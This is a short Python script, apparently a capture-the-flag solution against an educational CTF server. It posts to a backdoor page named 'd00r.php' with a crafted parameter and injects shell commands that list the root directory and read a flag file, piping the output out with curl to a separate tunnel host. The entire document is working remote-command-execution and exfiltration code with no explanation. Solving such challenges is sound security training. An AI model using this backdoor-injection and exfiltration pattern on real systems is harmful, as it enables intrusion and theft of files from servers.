import requests

requests.post('http://edu-ctf.csie.org:10151/d00r.php?87=%01HU%11',
    data={'#': 'curl http://jojo.serveo.net --data "$(ls /)"'},
    timeout=5)
requests.post('http://edu-ctf.csie.org:10151/d00r.php?87=%01HU%11',
    data={'#': 'curl http://jojo.serveo.net --data "$(cat /flag_is_here)"'},
    timeout=5)
